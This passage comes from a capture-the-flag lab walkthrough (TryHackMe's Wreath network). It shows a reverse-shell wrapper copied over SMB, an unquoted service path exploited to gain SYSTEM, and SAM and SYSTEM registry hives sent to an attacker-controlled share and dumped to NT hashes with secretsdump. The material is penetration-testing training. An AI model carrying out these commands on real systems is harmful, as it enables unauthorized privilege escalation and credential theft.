+***
+
+Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.\
+
+
+First up, let's download the package:\
+`sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .`\
+
+
+_Note: On the AttackBox Impacket is preinstalled at_ `/opt/impacket/impacket`
+
+We can now start up a temporary SMB server:\
+`sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/99f9b77f1bf0.png" alt=""><figcaption></figcaption></figure>
+
+With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.
+
+Now, in our reverse shell, we can use this command to authenticate:\
+`net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/9a27791867af.png" alt=""><figcaption></figcaption></figure>
+
+This authenticates with the server using the credentials we set (`user:s3cureP@ssword`). We can now copy our compiled  `Wrapper.exe` program up to the target. Due to file permissions on the normal `C:\Windows\Temp` directory, we are doing this from our current user's own `%TEMP%` directory:\
+`copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe`
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/857c1d682e0e.png" alt=""><figcaption></figcaption></figure>
+
+_Note: We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway._
+
+It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.
+
+That said, to prevent errors down the line, we should disconnect from it for the time being:\
+`net use \\ATTACKER_IP\share /del`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/060e1ee4ce7c.png" alt=""><figcaption></figcaption></figure>
+
+Start a listener on your chosen port and try to execute the wrapper manually -- you should get a reverse shell back:\
+`"%TEMP%\wrapper-USERNAME.exe"`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/ff8bafc56cb6.png" alt=""><figcaption></figcaption></figure>
+
+Excellent. Our program works and is not getting caught by the antivirus. We are now ready to exploit that unquoted service path vulnerability!
+
+Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. `C:\Directory One\Directory Two\Executable.exe` ) then Windows will look for the executable in the following order:
+
+1. `C:\Directory.exe`
+2. `C:\Directory One\Directory.exe`
+3. `C:\Directory One\Directory Two\Executable.exe`\
+
+
+What this means is that if we can create a file called `Directory.exe` in the root directory, or `C:\Directory One\`, then we can trick Windows into executing our file instead!
+
+Let's take a look at the actual path of our vulnerable service: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. There are technically three places we _could_ add our program here:
+
+* We could put it in the root directory and call it `Program.exe`. This is _very_ unlikely to work, as the chances of having write permissions here are virtually 0.
+* We could put it in the `C:\Program Files (x86)\` directory and call it `System.exe`. Once again, this is unlikely to work because the chances of being able to write into `C:\Program Files (x86)\` are minimal.
+* We could put it in `C:\Program Files (x86)\System Explorer\` and call it `System.exe`. This one will work! Remember we checked the permissions of this directory in the last task and found that we had full access? This means that we can place our wrapper into this directory, then when the service is restarted, our wrapper will be executed giving us a shell as the local system user!
+
+Before blindly copying your wrapper, check to make sure that another user isn't currently performing this exploit:\
+`dir "C:\Program Files (x86)\System Explorer\"`\
+
+
+If you see a file called `System.exe` in the output then _please wait a few minutes until it disappears._
+
+If there is not already an exploit in the directory then it's time to root this thing!
+
+Copy your wrapper from `C:\Windows\Temp\wrapper-USERNAME.exe` to `C:\Program Files (x86)\System Explorer\System.exe` .\
+`copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/7faedc9a86ab.png" alt=""><figcaption></figcaption></figure>
+
+_Note: There is a cleanup script running on this target once every five minutes in case any hackers are too sloppy to cover up their tracks by restoring the service to working order. If your payload disappears before execution then you may have been caught by the script. If this happens, just repeat this step and the exploit should work._
+
+Our exploit is in place! We have two options to activate it:
+
+* This service starts automatically at boot, so we could try restarting the entire box (although we don't actually have the required permissions to do this to prevent users from taking the box down).
+* We could try restarting the service itself. Given the amount of access to this service that Thomas has given to his account, it's a fair bet that we might be able to do this.
+
+Failing either of these, we would be stuck waiting for someone to restart the target for us naturally.
+
+Let's try stopping the service:\
+`sc stop SystemExplorerHelpService`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/adffd8978a57.png" alt=""><figcaption></figcaption></figure>
+
+We can stop the service, so chances are we can also start it! Set up a listener on your attacking machine then start the service:\
+`sc start SystemExplorerHelpService`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/210940d0f105.png" alt=""><figcaption></figcaption></figure>
+
+We have root!
+
+Notice that we got a message telling us that the service failed to start. This is because the wrapper we uploaded isn't actually a real Windows service file. Our executable still gets executed, but as far as Windows is concerned, the service failed to start.
+
+
+
+There's only one thing left to do here.
+
+Let's clear up after ourselves by deleting the wrapper and starting the service:\
+`del "C:\Program Files (x86)\System Explorer\System.exe"`\
+`sc start SystemExplorerHelpService`\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/da5255d9443c.png" alt=""><figcaption></figcaption></figure>
+
+Clearing up after exploits is a good habit to get into. This also has the added bonus of being courteous to other users in the box who may be about to perform the exploit. Note that deleting the wrapper and restarting the service did not destroy the system shell!
+
+
+
+Bonus Question (optional): Research how to write a real Windows Service executable in C# and try to create a wrapper (or even a full reverse shell!) that doesn't cause the `sc start` command to error out.
+
+The code [here](https://github.com/mattymcfatty/unquotedPoC) may help (but please do not run this as-is because it will create a new user with a known password):
+
+
+
+## Exfiltration Techniques & Post Exploitation
+
+Data exfiltration is something that should _never_ be considered without explicit prior consent. Generally speaking, most external engagements will strongly prohibit taking data from compromised systems; however, it is worth bearing in mind that this may not be the case for internal engagements -- and some external engagements outright set targets for the red team that revolve around exfiltrating a set piece of data from the targets once compromised. Even if this is a skill that may not be used on a daily basis, it is still well worth learning.\
+
+
+***
+
+The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can't just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file.
+
+A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.\
+
+
+In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP; however, in an unmonitored network these are still good options for moving files around.
+
+It's worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it's worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.\
+
+
+***
+
+In short, the only limitation when it comes to exfiltration is your imagination. Whilst there are certainly common techniques available (and many tools around to take advantage of them) it will always be the new and obscure methods that are the most successful. Who knows? Maybe you'll even find a legitimate use for steganography!
+
+As extra reading, [PentestPartners](https://www.pentestpartners.com/) have a superb [blog post](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/) on this topic.
+
+
+
+### Answer the questions below
+
+Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?
+
+```
+// Some code
+```
+
+For what reason is HTTPS preferred over HTTP during exfiltration?
+
+```
+/
+```
+
+Let's put this into practice!
+
+We need some way to prove to Thomas that we've compromised his PC. We could leave a note on his Desktop, or we could be fancy and give him his Administrator password hash to prove that we've rooted it.\
+
+
+There's no way we're going to get Mimikatz past Defender. We have SYSTEM access, so we could technically just disable Defender, but let's try to do this with as little destructiveness as possible (not least for other users on the network). What we _can_ do is grab the files containing the password hashes, pass them back to our attacking machine, then dump the hashes locally. On Linux this would be a simple matter of grabbing `/etc/shadow`. On Windows it is slightly more complex than that.
+
+Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the `HKEY_LOCAL_MACHINE\SAM` hive. This can also be found as a file at `C:\Windows\System32\Config\SAM`, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:\
+`reg.exe save HKLM\SAM sam.bak`\
+
+
+This saves the hive as a file called "sam.bak" in the current directory.
+
+Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:\
+`reg.exe save HKLM\SYSTEM system.bak`\
+
+
+With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.
+
+It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the `net use` command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:\
+`reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak`\
+or\
+`move sam.bak \\ATTACKING_IP\share\sam.bak`
+
+_Note: You may encounter an error when reconnecting. This is due to the way that Windows handles cached credentials:_\
+\
+&#xNAN;_&#x53;ystem error 1312 can usually be solved by connecting using an arbitrary domain. For example, specifying_ `/USER:domain\user` _rather than just the username. The same SMB server will still work here; however, Windows sees it as a different user account and thus allows the new connection._
+
+<figure><img src="https://assets.tryhackme.com/additional/wreath-network/52376f416ede.png" alt=""><figcaption></figcaption></figure>
+
+With both files stored locally, we can now dump some hashes! Make sure you delete the .bak files from the target if you copied them rather than moving them.
+
+Once again, remember to disconnect from the SMB server!
+
+There are a variety of tools that could do this job for us. The most reliable is (as is often the case), a script from the Impacket library: `secretsdump.py` .
+
+Let's use this against our dumped hives:\
+`python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL`\
+
+
+![Demonstration of using Impacket against the dumped hives. Password hashes are obtained.](https://assets.tryhackme.com/additional/wreath-network/28853bc2be23.png)
+
+Each local account on the target is shown here, in a format of Username, RID, LM hash, NT hash -- separated by colons. We are interested in the _NT_ hashes -- the last section (blurred). As a side note: `31d6cfe0d16ae931b73c59d7e0c089c0` is an empty hash, and indicates that the account is not activated. These can thus be discounted.
+
+***
+
+What is the Administrator NT hash for this target?
+
+```
+// Some code
+```
+
+We have now completed everything we set out to accomplish: demonstrating that Wreath's network is vulnerable. Take this chance to go through the network and clean up after yourself. Aside from being courteous to other users of the network, this is also something you should always do in real life; we wouldn't want to make things easy for an attacker, would we?\
+
+
+Remove all the tools, shells, payloads, accounts, and any other remnants you left behind.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
